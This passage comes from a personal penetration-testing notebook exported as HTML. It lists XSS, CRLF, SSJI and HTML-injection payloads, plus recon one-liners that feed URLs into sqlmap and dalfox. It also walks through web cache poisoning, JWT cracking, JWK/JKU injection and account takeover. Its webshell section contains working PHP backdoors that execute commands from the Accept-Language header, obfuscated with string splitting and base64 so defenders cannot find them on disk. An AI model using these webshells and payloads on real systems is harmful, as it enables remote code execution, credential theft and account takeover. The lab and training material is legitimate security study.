http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0;url=javascript:alert(1)&amp;quot;&amp;gt;</p><p>&amp;lt;object data=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;</p><p>&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;</p><p>&amp;lt;audio autoplay src=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;/audio&amp;gt;</p><p>&amp;lt;iframe src=&amp;quot;javascript:&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</p><p>&amp;lt;style&amp;gt;*{background-image:url(javascript:alert(1))}&amp;lt;/style&amp;gt;</p><p>&amp;lt;details open ontoggle=alert(1)&amp;gt;&amp;lt;summary&amp;gt;Click%20me!&amp;lt;/summary&amp;gt;&amp;lt;/details&amp;gt;</p><p>&amp;lt;base href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;.&amp;quot;&amp;gt;Click me&amp;lt;/a&amp;gt;</p><p>JaVaSCriPt:prompt//${{constructor:alert(1)}}//</p><p>&lt;isindex formaction=&quot;javascript:alert(1)&quot;&gt;yiipi&lt;/isindex&gt;</p><p>&lt;a href=&quot;javascript&amp;#x3a;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&quot;&gt;click me&lt;/a&gt;</p><p>&lt;input/onfocus=write(1) autofocus&gt;</p><p>&lt;script&gt;setTimeout(function(){}, 5000)&lt;/script&gt;</p><p>&lt;svg onload=setTimeout(function(){},5000)&gt;</p><p>&lt;img src=&quot;image.jpg&quot; onerror=&quot;setTimeout(function(){}, 5000)&quot;&gt;</p><p>&lt;iframe onload=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/iframe&gt;</p><p>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpfTwvc2NyaXB0Pg==&quot; onreadystatechange=&quot;setTimeout(function(){},5000)&quot;&gt;&lt;/object&gt;</p><p>&lt;video onloadeddata=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/video&gt;</p><p>&lt;audio oncanplay=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/audio&gt;</p><p>&lt;marquee onfinish=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;/marquee&gt;</p><p>&lt;details ontoggle=&quot;setTimeout(function(){}, 5000)&quot;&gt;&lt;summary&gt;X&lt;/summary&gt;Y&lt;/details&gt;</p><p>&lt;body onload=setTimeout(function(){},5000);&gt;</p><p>%3Cscript%3EsetTimeout(function(){},10000);%3C/script%3E</p><p>&amp;lt;script&amp;gt;setTimeout(function(){},5000);&amp;lt;/script&amp;gt;</p><p>%253Cscript%253EsetTimeout(function(){},5000);%253C/script%253E</p><p>&amp;#60;script&amp;#62;setTimeout(function(){},5000);&amp;#60;/script&amp;#62;</p><p>\x3Cscript\x3EsetTimeout(function(){},5000);\x3C/script\x3E</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--XSS--Oneliner_721.html"></a><h1 class='title level-7'>Oneliner</h1><br/><p><span style="color:#3f4043;">Finding endpoints:</span></p><p>feroxbuster -u <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a> -e -q --no-state -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ferox.txt</p><p></p><p><span style="color:#3f4043;">Extract URLs only that are status code 200 and doesnt not contain useless extensions:</span></p><p>cat ferox.txt | grep -e &#39;200&#39; | grep -oE &#39;https?://[^[:space:]]+&#39; | grep -Ev &#39;\.(gif|png|jpg|js|css|txt)$&#39; &gt; 2URLS.txt</p><p></p><p></p><p>gospider -s <a href="http://testphp.vulnweb.com">http://testphp.vulnweb.com</a> -c 10 -d 5 --blacklist &quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)&quot; | grep -e &quot;code-200&quot; | awk &#39;{print $5}&#39;| grep &quot;=&quot; | qsreplace -a | dalfox pipe | tee result.txt </p><p></p><p></p><p></p><p></p><p></p><p>cat katana.txt | grep &quot;=&quot;</p><p></p><p>cat domains.txt | paramspider -o output_directory -l high</p><p></p><p>gospider -s <a href="http://testphp.vulnweb.com">http://testphp.vulnweb.com</a> -c 10 -d 5 --blacklist &quot;.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)&quot; | grep -e &quot;code-200&quot; | awk &#39;{print $5}&#39; | grep &quot;=&quot; | while read -r url; do sqlmap -u &quot;$url&quot; --batch --level=5 --risk=3 --random-agent --output-dir=./sqlmap; done</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--SSJI__Server_Side_JavaScript_Injection_504.html"></a><h1 class='title level-6'>SSJI | Server Side JavaScript Injection</h1><br/><p></p><p><span style="color:#3f4043;">Payloads:</span></p><p></p><p>res.end(require(&#39;fs&#39;)readdirSync(&#39;.&#39;).toString())</p><p>res.end(require(&#39;child_process&#39;)execSync(&#39;env&#39;).toString())</p><p></p><p><h3>If this works, use JSGen to get shell</h3></p><p><a href="https://pentesterslife.blog/2018/06/28/jsgen/">https://pentesterslife.blog/2018/06/28/jsgen/</a></p><p><a href="https://github.com/S3cur3Th1sSh1t/SSJI---JSGen">https://github.com/S3cur3Th1sSh1t/SSJI---JSGen</a></p><p></p><p><a href="https://blog.gdssecurity.com/labs/2015/4/15/nodejs-server-side-javascript-injection-detection-exploitati.html">https://blog.gdssecurity.com/labs/2015/4/15/nodejs-server-side-javascript-injection-detection-exploitati.html</a></p><p><a href="https://www.youtube.com/watch?v=qFHlt9CHC0I&list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg">https://www.youtube.com/watch?v=qFHlt9CHC0I&amp;list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--JavaScript_Attacks--Prototype_Pollution_505.html"></a><h1 class='title level-6'>Prototype Pollution</h1><br/><p>q=rs0n&amp;resources[__proto__][hasOwnProperty]=rs0n&amp;</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks_593.html"></a><h1 class='title level-5'>Less common web attacks</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--HPP__HTTP_Parameter_Pollution_594.html"></a><h1 class='title level-6'>HPP | HTTP Parameter Pollution</h1><br/><p></p><p></p><p><span style="color:#3f4043;">In this example, the attacker is injecting an additional &quot;q&quot; parameter into the URL. This could potentially allow the attacker to bypass input validation or manipulate the application&#39;s logic, depending on how the application handles the additional parameter.</span></p><p></p><p>POST /search HTTP/1.1</p><p>Host: example.com</p><p>Content-Type: application/x-www-form-urlencoded</p><p></p><p>q=test&amp;q=test2</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--HRS__HTTP_Response_Splitting_595.html"></a><h1 class='title level-6'>HRS | HTTP Response Splitting</h1><br/><p>POST / HTTP/1.1</p><p>Host: example.com</p><p>Content-Type: application/x-www-form-urlencoded</p><p></p><p>param=value&amp;header=Content-Type: text/html%0d%0aX-Custom-Header: injected content</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--Response_Manipulation_601.html"></a><h1 class='title level-6'>Response Manipulation</h1><br/><p>Intercept and copy server response on valid request and copy it over to when you get an invalid response.</p><p></p><p><a href="https://www.youtube.com/results?search_query=resposne+manipulation">https://www.youtube.com/results?search_query=resposne+manipulation</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--HTML_Injection_612.html"></a><h1 class='title level-6'>HTML Injection</h1><br/><p><h3>HTML injection is a type of security vulnerability that occurs when a attacker is able to inject malicious HTML code into a web page viewed by other users. This can have a variety of impacts, including:</h3><ul><li>Stealing sensitive information from users, such as login credentials or personal information.</li><li>Redirecting users to malicious websites, potentially leading to further compromise or phishing attacks.</li><li>Modifying the appearance of a website, potentially misleading users and damaging the website&#39;s reputation.</li><li>Executing scripts on the user&#39;s computer, potentially allowing the attacker to take control of the user&#39;s device.</li></ul></p><p></p><p><h3>It is important for web developers to validate and sanitize user input to prevent HTML injection and other types of injection attacks.</h3></p><p></p><p></p><p></p><p></p><p></p><p>&lt;iframe src=//malicious-website.com/toplevel.html&gt;&lt;/iframe&gt;</p><p>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;top.window.location = &quot;<a href="https://malicious-website.com/pwned.html">https://malicious-website.com/pwned.html</a>&quot;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</p><p></p><p><span style="color:#3f4043;">Sometimes you can use this to perform SSRF. And if you&#39;re in a cloud environment where you can make meta-data requests, this can get nasty fast.</span></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--special_character_abuse_632.html"></a><h1 class='title level-6'>special character abuse</h1><br/></div><div class='page'><a name="ethdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Less_common_web_attacks--special_character_abuse--CRLF_Injection_630.html"></a><h1 class='title level-7'>CRLF Injection</h1><br/><p><h3>CR and LF are </h3><strong>control characters or bytecode that can be used to mark a line break in a text file</strong><h3>. CR = Carriage Return ( \r , 0x0D in hexadecimal, 13 in decimal) — moves the cursor to the beginning of the line without advancing to the next line.</h3></p><p></p><p></p><p><span style="color:#3f4043;">You can use %0d (carriage return, aka take cursor to start) and then %0a (newline) to trick the application into thinking the input starts here. </span></p><p></p><p></p><p>/%0d%0aSet-cookie:%20CRLF=%20CRLF</p><p>/%0aSet-cookie: CRLF%0a%0a&lt;img src=x onerror=alert(9)&gt;</p><p>/%0d%0aLocation:%20http://www.evilzone.org</p><p>/%0d%0a%0d%0a </p><p></p><p>%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</p><p></p><p><a href="https://youtu.be/0R3w3JSGCIw?list=PLtiuVR3b_k4DlnU97uvXDyErEdFd4diDx&t=33">https://youtu.be/0R3w3JSGCIw?list=PLtiuVR3b_k4DlnU97uvXDyErEdFd4diDx&amp;t=33</a></p><p></p><p></p><p><span style="color:#3f4043;">Use these payloads on webroot and paramaters like search: </span></p><p><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md">https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md</a></p><p><a href="https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt">https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/crlfinjection.txt">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/crlfinjection.txt</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Type_Confusion_620.html"></a><h1 class='title level-5'>Type Confusion</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Type_Confusion--PHP_Type_Juggling_680.html"></a><h1 class='title level-6'>PHP Type Juggling</h1><br/><p><a href="https://www.youtube.com/watch?v=_Zr84AeHECA&t=201s">https://www.youtube.com/watch?v=_Zr84AeHECA&amp;t=201s</a></p><p></p><p><img src="images/680-1.png" alt="images/680-1.png" /></p><p></p><p><h3>If you can change the request type to json, you can make the application interpret the password as an integer, and not a string. And due to type confusoin in php (still an issue), and if the developers haven&#39;t thought of this, it&#39;s possible to make this evaluate to true, and therefore bypassing authentification.</h3></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Type_Confusion--Type_Confusion_in_MySQL_Node.js_679.html"></a><h1 class='title level-6'>Type Confusion in MySQL Node.js</h1><br/><p><a href="https://youtu.be/ZANv0DlrTN8?t=814">https://youtu.be/ZANv0DlrTN8?t=814</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--SSRF_622.html"></a><h1 class='title level-5'>SSRF</h1><br/><p><span style="color:#3f4043;">SSRF Basics:</span></p><p><a href="https://www.youtube.com/watch?v=eVI0Ny5cZ2c">https://www.youtube.com/watch?v=eVI0Ny5cZ2c</a></p><p></p><p><span style="color:#3f4043;">SSRF wrappers and techniques:</span></p><p><a href="https://highon.coffee/blog/ssrf-cheat-sheet/">https://highon.coffee/blog/ssrf-cheat-sheet/</a></p><p></p><p>probe internal subdomains, and also external, leveraging ssrf</p><p><a href="https://github.com/assetnote/surf">https://github.com/assetnote/surf</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Access_Control_Vulnerabilities_650.html"></a><h1 class='title level-5'>Access Control Vulnerabilities</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Access_Control_Vulnerabilities--X-Original-URL_651.html"></a><h1 class='title level-6'>X-Original-URL</h1><br/><p><span style="color:#3f4043;">Can circumvent URL based access control.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p></p><p>X-Original-URL: /admin</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning_652.html"></a><h1 class='title level-5'>Web Cache Poisoning</h1><br/><p><ul><li>Websites uses caching to mitigate load on the server.</li><li>The cache server sits between the web server and the user.</li><li>There&#39;s a cache key that&#39;s being used to validate whether an incoming request should be served directly from the cache server, or if it should redirect to web server.</li><li>If you can find unkeyed areas of the web server, and potentially poison it (typically through unkeyed headers), it&#39;s possible to make that request get cache keyed at the cache server level and poison the cache to be served for all subsequent visitors of that particular endpoint.</li><li>Utilize techniques like manual enumeration and param miner to identify potential vulnerable headers.</li><li>Web Cache Poisoning can be chained with attacks such as XSS, JavaScript injection, and open redirection to name some realistic ones.  </li></ul></p><p></p><p>param miner:</p><p>guess headers, extensions, output. In output section you&#39;ll see if it found any interesting headers</p><p>can also go to logger to see its requests</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning--Unkeyed_Header_653.html"></a><h1 class='title level-6'>Unkeyed Header</h1><br/><p><img src="images/653-1.png" alt="images/653-1.png" /></p><p></p><p><img src="images/653-2.png" alt="images/653-2.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning--Unkeyed_Cookie_654.html"></a><h1 class='title level-6'>Unkeyed Cookie</h1><br/><p><span style="color:#3f4043;">Test on the made up endpoint, and we can see the cookie value is reflected back in the js. After getting a hit on x-cache, we can change the endpoint to rootdir and send request enough to re-cache. If this works, all new users visiting this page will have our injection js execute on their page</span></p><p><img src="images/654-1.png" alt="images/654-1.png" /></p><p></p><p></p><p><img src="images/654-2.png" alt="images/654-2.png" /></p><p></p><p><img src="images/654-3.png" alt="images/654-3.png" /></p><p></p><p>BAM</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning--Multiple_Headers_655.html"></a><h1 class='title level-6'>Multiple Headers</h1><br/><p><img src="images/655-1.png" alt="images/655-1.png" /></p><p></p><p><img src="images/655-2.png" alt="images/655-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning--Unknown_Header_and_user_agent_restriction_656.html"></a><h1 class='title level-6'>Unknown Header and user agent restriction</h1><br/><p><img src="images/656-1.png" alt="images/656-1.png" /></p><p></p><p><img src="images/656-2.png" alt="images/656-2.png" /></p><p></p><p>And due to the “vary” header in the response, we needed the user agent too for it to successfully fire.</p><p></p><p>So we just added a simple &lt;img src=&quot;<a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo">https://exploit-0a4d00330455c077c008b8ba018f00d3.exploit-server.net/foo</a>&quot; /&gt; on a blog page on the side, the user retrieved it and we get their user agent in access log we can use to finish the initial cache poisoning attack to retrieve their cookie. Simply add their user agent in the cached server response and it will work on them in this case. </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Web_Cache_Poisoning--Unkeyed_query_string_657.html"></a><h1 class='title level-6'>Unkeyed query string</h1><br/><p><img src="images/657-1.png" alt="images/657-1.png" /></p><p></p><p><img src="images/657-2.png" alt="images/657-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Webshells_937.html"></a><h1 class='title level-5'>Webshells</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Common_Web_Attack_Techniques--Webshells--Stealthy_Webshell_in_Accept-Language_header_938.html"></a><h1 class='title level-6'>Stealthy Webshell in Accept-Language header</h1><br/><p>    &lt;?php</p><p></p><p>    if (isset($_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;])) {</p><p></p><p>        $acceptLanguage = $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;];</p><p></p><p>        $output = shell_exec($acceptLanguage);</p><p></p><p>        echo &quot;$output&quot;;</p><p>    }</p><p>    ?&gt;</p><p>    </p><p>    </p><p>&lt;?php</p><p>$dog = &#39;s&#39; . &#39;ys&#39; . &#39;tem&#39;;</p><p>$dog(&#39;echo hiii fred&#39;);</p><p>?&gt;</p><p></p><p>&lt;?php</p><p>$func = &#39;sys&#39; . &#39;tem&#39;;</p><p>if (isset($_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;])) {</p><p>    $acceptLanguage = $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;];</p><p>    $output = $func($acceptLanguage);</p><p>    echo $output;</p><p>}</p><p>?&gt;</p><p></p><p>works just fine (useful for making webshell hard to find from blueteam searching from disk)</p><p><img src="images/938-1.png" alt="images/938-1.png" /></p><p></p><p></p><p><img src="images/938-2.png" alt="images/938-2.png" /></p><p></p><p></p><p>=====================================</p><p></p><p></p><p><span style="color:#3f4043;">Base64 encoded version works too &lt;33</span></p><p></p><p>&lt;?php if(isset($_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;])){$m513211969=$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;];if(!empty($m513211969)&amp;&amp;preg_match(&#39;/^[a-zA-Z0-9\/\+=]+$/&#39;,$m513211969)){$f2377387560=base64_decode($m513211969);$v3437106334=shell_exec($f2377387560);if($v3437106334!==null){echo&quot;&lt;pre&gt;$v3437106334&lt;/pre&gt;&quot;;}}}?&gt;</p><p></p><p><img src="images/938-3.png" alt="images/938-3.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API_463.html"></a><h1 class='title level-4'>API</h1><br/><p><span style="color:#3f4043;">API Security guidelines:</span></p><p><a href="https://www.mediafire.com/file/hkfx8ydpuw2qrry/API+Security+guidelines.pdf/file">https://www.mediafire.com/file/hkfx8ydpuw2qrry/API+Security+guidelines.pdf/file</a></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_enumeration_465.html"></a><h1 class='title level-5'>API enumeration</h1><br/><p><span style="color:#3f4043;">Perform scanning with kiterunner and fuzzer to find endpoints.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">mitmweb</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">manual web test especially for APIs</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">import mitmweb file to postmaN</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">chain postman thoruhg burp (passive listening on burp)</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">run full collection with whatever u want</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">BAM, from here u have full targetlist on both postman and burpsuite with the benefits of the tools from each ; )</span></p><p></p><p></p><p></p><p>mitmweb</p><p>(capture all manual requests)</p><p>sudo mitmproxy2swagger -i ~/Downloads/flows -o spec.yaml -p &#39;<a href="http://crapi.apisec.ai:8888'">http://crapi.apisec.ai:8888&#39;</a> -f flow</p><p>sudo subl spec.yaml</p><p>(import to postman - fix login request, add token, save, setup test, and proxy through burp)</p><p></p><p><ul><li>Scan for endpoints</li><li>fuzz for paramaters in both body and URL</li><li></li></ul></p><p></p><p><a href="https://www.ethicalcheck.dev/">https://www.ethicalcheck.dev/</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_enumeration--Finding_username-email_471.html"></a><h1 class='title level-6'>Finding username/email</h1><br/><p>API Endpoint: /identity/api/auth/login</p><p></p><p>This allows us to easily enumerate emails through the API.</p><p></p><p></p><p><span style="color:#3f4043;">Username/email doesn&#39;t exist.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><img src="images/471-1.png" alt="images/471-1.png" /></p><p></p><p>Username/email exists, but wrong password.</p><p><img src="images/471-2.png" alt="images/471-2.png" /></p><p></p><p>Successful login.</p><p><img src="images/471-3.png" alt="images/471-3.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_enumeration--kiterunner_486.html"></a><h1 class='title level-6'>kiterunner</h1><br/><p><a href="https://github.com/assetnote/kiterunner">https://github.com/assetnote/kiterunner</a></p><p></p><p>kr scan <a href="http://127.0.0.1">http://127.0.0.1</a> -A=apiroutes-210328:20000</p><p></p><p><img src="images/486-1.png" alt="images/486-1.png" /></p><p></p><p></p><p>sudo wget <a href="https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz">https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</a></p><p>sudo tar -xvf routes-large.kite.tar.gz </p><p>kr scan <a href="http://127.0.0.1:80">http://127.0.0.1:80</a> -w routes-large.kite</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks_466.html"></a><h1 class='title level-5'>API Attacks</h1><br/><p><span style="color:#3f4043;">Excessive Data Disclosure: </span><ul><li><span style="color:#3f4043;">When the response gives you additional information which is not relevant to your request. An example of this would be to give email, account creation, privilege information etc for other users that is not relevant to this request.</span></li></ul><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">BOLA: </span><ul><li><span style="color:#3f4043;">When you can access resources you&#39;re not authorized to.</span></li></ul><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">BFLA:</span><ul><li><span style="color:#3f4043;">When you can perform actions and functions you&#39;re not authorized to.</span></li><li><span style="color:#3f4043;">This can apply for both lateral and escalated actions.</span></li></ul><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Improper Assets Management: </span><ul><li><span style="color:#3f4043;">Testing Versioning essentially. (V1,V2,V3)</span></li><li><span style="color:#3f4043;">Set variable to change versioning on all requests in postman, in both authorized and unauthorized sessions</span></li><li><span style="color:#3f4043;">Examples of vulnerabilities might be lack of rate limiting, command injection, excessive data exposure, etc that would not be taking place in another version. Typically the earlier version contains more issues</span></li></ul><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Mass Assignment: </span><ul><li><span style="color:#3f4043;">Adding or overwriting parameters and object properties to manipulate response. An example would be to add your own user as an administrator upon account creation by doing exactly this.</span></li><li><span style="color:#3f4043;">Look for parameters involved in user account properties, critical functions, and administrative actions.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></li></ul></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens_464.html"></a><h1 class='title level-6'>JWT Tokens</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--Cracking_JWT_signature_467.html"></a><h1 class='title level-7'>Cracking JWT signature</h1><br/><p><span style="color:#3f4043;">use crunch or rockyou etc for lists</span></p><p>crunch 5 5 &gt; pass.txt</p><p></p><p></p><p><span style="color:#3f4043;">Make a user. Take their JWT token and attempt cracking it like so:</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span>john --wordlist=/usr/share/wordlists/rockyou.txt jwt --format=HMAC-SHA512 --fork=4 <span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><img src="images/467-1.png" alt="images/467-1.png" /></p><p></p><p>Or like so: </p><p>jwt_tool eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJiQGIuY29tIiwiaWF0IjoxNjY4ODEwNDE1LCJleHAiOjE2Njg4OTY4MTV9.MsWAWE_9SaFUlFnnJM_RAk1egQcD9JMNaETPEZ-myrOaynYyPeVvXCUfE5MfzfD3ob2TWJz00OxBFTwdb5h0tA -C -d /home/kali/ja<span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><img src="images/467-2.png" alt="images/467-2.png" /></p><p></p><p>Now, what you can do is this:<ul><li>You&#39;re logged in as this user with this token:</p><p></li></ul><img src="images/467-3.png" alt="images/467-3.png" /></p><p></p><p>https://jwt.io/</p><p><img src="images/467-4.png" alt="images/467-4.png" /></p><p>Let&#39;s now modify the email to another user, and see if we can access their account, even though we don&#39;t know their password.</p><p><img src="images/467-5.png" alt="images/467-5.png" /></p><p>We tried changing to a@a.com, but no luck.</p><p></p><p>Let&#39;s modify the token in jwt again but this time use the password from the API provider for the signature that we cracked.</p><p> <img src="images/467-6.png" alt="images/467-6.png" /></p><p> And BAM, this allows us to perform an account takeover without their password.</p><p> </p><p> <img src="images/467-7.png" alt="images/467-7.png" /></p><p> </p><p></p><p>Hashcat syntax:</p><p></p><p>hashcat -m 16500 jwt /usr/share/wordlists/rockyou.txt <img src="images/467-8.png" alt="images/467-8.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--none_signature_473.html"></a><h1 class='title level-7'>none signature</h1><br/><p>Sometimes developers does not check the signature so you can literally just alter “alg” to &quot;none&quot;. And remove the signature value entirely in the JWT except the trailing dot. </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--JWK_Injection_646.html"></a><h1 class='title level-7'>JWK Injection</h1><br/><p><span style="color:#3f4043;">Generate RSA Key.</span></p><p><img src="images/646-1.png" alt="images/646-1.png" /></p><p></p><p><span style="color:#3f4043;">Change sub value to the account you wanna take over. </span></p><p><img src="images/646-2.png" alt="images/646-2.png" /></p><p></p><p><span style="color:#3f4043;">“Attack”, “Embedded JWK”, then Sign the key. </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Values will get updated, and we can now perform ATO on the admin.</span></p><p><img src="images/646-3.png" alt="images/646-3.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--JKU_Injection_647.html"></a><h1 class='title level-7'>JKU Injection</h1><br/><p><span style="color:#3f4043;">Generate RSA key.</span></p><p></p><p><span style="color:#3f4043;">Then copy</span></p><p><img src="images/647-1.png" alt="images/647-1.png" /></p><p></p><p></p><p><span style="color:#3f4043;">Set up exploit server and host file with this body:</span></p><p></p><p></p><p>{</p><p>    &quot;keys&quot;:  [</p><p>{</p><p>    &quot;kty&quot;: &quot;RSA&quot;,</p><p>    &quot;e&quot;: &quot;AQAB&quot;,</p><p>    &quot;kid&quot;: &quot;09a1fb72-62d0-4734-8314-50584ff91b44&quot;,</p><p>    &quot;n&quot;: &quot;iDveG1SIP0OyqigWSEljDa64qihOw7cwuCiiHpb68ZdFR8i2XnHqkkcJRwUzYucLyxfIbXsBtjt-V9f8gY_WS79iAbWsQ08YJmgA9Nhv1dwIkpFUWES7JhYyILgqpzhKz25wrv6iKVYYKLXlzqS9UvruUjx06ia-DvLMC66Q0yeYeZa_AkbSVDiTb-HnxLaLogQN3xheSmNz2a6jbyaMwUSjJqDXzV0skvlIoTikwK3Yhup-AgteLH7eZyjSpbzkVjdMZ4sGgjHKNbqK8mXfNbUbXlQjWCRp5g7up26h4xqHnZBgF6tK6i8h9Mwib06y-f7z4isQDDgTrELzQi4iNw&quot;</p><p>}</p><p>    ]</p><p>}</p><p></p><p></p><p><span style="color:#3f4043;">Then modify sub and kid values, inject a jku paramater with the hosted file on your exploit server, and finally sign it with your create RSA key.</span></p><p><img src="images/647-2.png" alt="images/647-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--KID_path_traversal_648.html"></a><h1 class='title level-7'>KID path traversal</h1><br/><p>Make new symmetric key. In the “k” value insert a base64 encoded nullbyte like so</p><p><img src="images/648-1.png" alt="images/648-1.png" 